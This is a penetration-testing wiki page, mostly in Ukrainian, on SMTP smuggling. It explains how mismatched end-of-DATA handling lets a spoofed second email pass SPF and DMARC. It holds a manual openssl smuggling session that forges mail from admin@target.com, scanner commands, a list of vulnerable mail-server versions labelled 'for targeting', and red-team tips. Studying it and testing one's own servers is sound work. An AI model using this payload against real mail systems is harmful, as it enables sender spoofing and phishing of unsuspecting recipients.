# SMTP Smuggling

{{#include ../../banners/hacktricks-training.md}}

## Основна інформація

Цей тип вразливості був [**спочатку виявлений у цьому дописі**](https://sec-consult.com/blog/detail/smtp-smuggling-spoofing-e-mails-worldwide/), де пояснюється, що можна **експлуатувати невідповідності в інтерпретації протоколу SMTP** при завершенні відправлення листа. Це дозволяє атакувальнику прокрадати додаткові листи всередині тіла легітимного повідомлення та видавати себе за інших користувачів ураженого домену (наприклад, admin@outlook.com), обходячи захисні механізми, такі як SPF.

### Чому

Це відбувається тому, що в протоколі SMTP **дані повідомлення** контролюються користувачем (атакувальником), який може надіслати спеціально сформовані дані, зловживаючи відмінностями в парсерах, щоб прокрасти додаткові листи на сервер-одержувач. Подивіться на ілюстрований приклад з оригінального допису:

<figure><img src="../../images/image (8) (1) (1) (1) (1).png" alt=""><figcaption><p><a href="https://sec-consult.com/fileadmin/user_upload/sec-consult/Dynamisch/Blogartikel/2023_12/SMTP_Smuggling-Overview__09_.png">https://sec-consult.com/fileadmin/user_upload/sec-consult/Dynamisch/Blogartikel/2023_12/SMTP_Smuggling-Overview__09_.png</a></p></figcaption></figure>

### Як

Щоб експлуатувати цю вразливість, атакувальнику потрібно надіслати такі дані, що **Outbound SMPT server думає, що це лише 1 лист, а Inbound SMTP server вважає, що їх декілька**.

Дослідники виявили, що різні **Inbound SMTP server вважають різні символи кінцем даних** електронного повідомлення, тоді як Outbound SMTP server цього не роблять.\
Наприклад, звичайним кінцем даних є `\r\n.\r`. Але якщо Inbound SMTP server також підтримує `\n.`, атакувальник може просто додати **цей фрагмент у свій лист і почати вказувати SMTP-команди** для нового повідомлення, щоб прокрасти його, як на попередньому малюнку.

Звісно, це спрацює лише якщо **Outbound SMTP server також не розглядає цей фрагмент** як кінець даних повідомлення — інакше він побачить 2 листи замість одного. У підсумку, саме десинхронізація між серверами використовується в цій вразливості.

Потенційні послідовності для десинхронізації:

- `\n.`
- `\n.\r`

Зверніть увагу, що SPF обходиться, тому що якщо ви прокрадаєте лист від `admin@outlook.com` через лист від `user@outlook.com`, **відправник все одно залишається `outlook.com`.**

---

## Контрольний список атакувальника (які умови мають виконуватись?)

Щоб успішно прокрасти другий лист, зазвичай потрібно:

- Наявність outbound server A, через який ви можете відправляти (часто з валідними обліковими даними), який пересилає нестандартну послідовність кінця DATA без змін. Багато сервісів історично пересилали варіанти на кшталт `\n.\r\n` або `\n.\n`.
- Receiving server B, який інтерпретує ту нестандартну послідовність як кінець DATA і потім парсить те, що йде після, як нові SMTP-команди (MAIL/RCPT/DATA...).
- Outbound повинен фактично відправляти через `DATA` (не `BDAT`). Якщо A підтримує CHUNKING/BDAT, smuggling працює лише якщо він повертається до DATA (наприклад, B не рекламуватиме CHUNKING); інакше фреймінг по довжині в BDAT усуває неоднозначність.
- PIPELINING не є обов'язковим, але допомагає сховати ін'єктовані команди в одному TCP write, щоб проміжні пристрої не ресинхронізувалися.

Поширені варіанти кінця DATA, які варто тестувати (залежить від приймача):

- `\n.\n`
- `\n.\r\n`
- `\r.\r\n`
- `\r\n.\r` (bare CR at end)

Примітка: Працює перетин “що A пересилає” ∩ “що B приймає”.

---

## Приклад ручної експлуатації (одна сесія)

Нижче показана ідея на прикладі сирої STARTTLS SMTP сесії. Після першого блоку DATA ми вставляємо нестандартний термінатор, а потім інший SMTP-діалог, який сервер-одержувач може трактувати як нове повідомлення.

<details>
<summary>Manual smuggling session (STARTTLS)</summary>
```
$ openssl s_client -starttls smtp -crlf -connect smtp.example.com:587
EHLO a.example
AUTH PLAIN <base64(\0user@example.com\0password)>
MAIL FROM:<user@example.com>
RCPT TO:<victim@target.com>
DATA
From: User <user@example.com>
To: victim <victim@target.com>
Subject: legit

hello A
\n.\r\nMAIL FROM:<admin@target.com>
RCPT TO:<victim@target.com>
DATA
From: Admin <admin@target.com>
To: victim <victim@target.com>
Subject: smuggled

hello B
\r\n.\r\n
```
If A forwards `\n.\r\n` and B accepts it as end‑of‑DATA, message “hello B” may be accepted as a second email from `admin@target.com` while passing SPF (aligned with A’s IPs).
</details>

Tip: When testing interactively, ensure `-crlf` is used so OpenSSL preserves CRLF in what you type.

---

## Автоматизація та сканери

- hannob/smtpsmug: send a message ending with multiple malformed end‑of‑DATA sequences to see what a receiver accepts.
- Example: `./smtpsmug -s mail.target.com -p 25 -t victim@target.com`
- The‑Login/SMTP‑Smuggling‑Tools: scanner for both inbound and outbound sides plus an analysis SMTP server to see exactly which sequences survive a sender.
- Inbound quick check: `python3 smtp_smuggling_scanner.py victim@target.com`
- Outbound via a relay: `python3 smtp_smuggling_scanner.py YOUR@ANALYSIS.DOMAIN --outbound-smtp-server smtp.relay.com --port 587 --starttls --sender-address you@relay.com --username you@relay.com --password '...'
`

These tools help you map the A→B pairs where smuggling actually works.

---

## CHUNKING/BDAT vs DATA

- DATA uses a sentinel terminator `<CR><LF>.<CR><LF>`; any ambiguity in how CR/LF are normalized or dot‑stuffed leads to desync.
- CHUNKING (BDAT) frames the body with an exact byte length and therefore prevents classic smuggling. However, if the sender falls back to DATA (because the receiver doesn’t advertise CHUNKING), classic smuggling becomes possible again.

---

## Notes on affected software and fixes (for targeting)

- Postfix: prior to 3.9 the default tolerated bare LFs; from 3.5.23/3.6.13/3.7.9/3.8.4 admins can enable `smtpd_forbid_bare_newline`. Current recommendation is `smtpd_forbid_bare_newline = normalize` (3.8.5+/3.7.10+/3.6.14+/3.5.24+) or set to `reject` for strict RFC enforcement.
- Exim: fixed in 4.97.1 (and later) for variants relying on mixed end‑of‑DATA sequences when DATA is used. Older 4.97/4.96 may be exploitable depending on PIPELINING/CHUNKING.
- Sendmail: fixed in 8.18; older 8.17.x accepted some non‑standard terminators.
- Various libraries/servers (e.g., aiosmtpd before 1.4.5, some vendor gateways, and specific SaaS relays) had similar issues; modern versions tend to accept DATA only with strict `<CR><LF>.<CR><LF>`.

Use the scanners above to verify current behavior; many vendors changed defaults in early 2024–2025.

---

## Tips for red team ops

- Favor large commodity senders for A (historically Exchange Online, shared hosters, etc.). If they still forward some non‑standard EOM and they’re in the victim’s SPF, your smuggled MAIL FROM will inherit their reputation.
- Enumerate B’s SMTP extensions: `EHLO` banner for PIPELINING/CHUNKING; if CHUNKING is missing you have a better chance from BDAT‑first senders. Combine with malformed EOMs to probe acceptance.
- Watch headers: the smuggled message will usually create a separate Received chain starting at B. DMARC will often pass because MAIL FROM aligns with A’s IP space.

---

## **References**

- [https://sec-consult.com/blog/detail/smtp-smuggling-spoofing-e-mails-worldwide/](https://sec-consult.com/blog/detail/smtp-smuggling-spoofing-e-mails-worldwide/)
- [https://www.postfix.org/smtp-smuggling.html](https://www.postfix.org/smtp-smuggling.html)

{{#include ../../banners/hacktricks-training.md}}
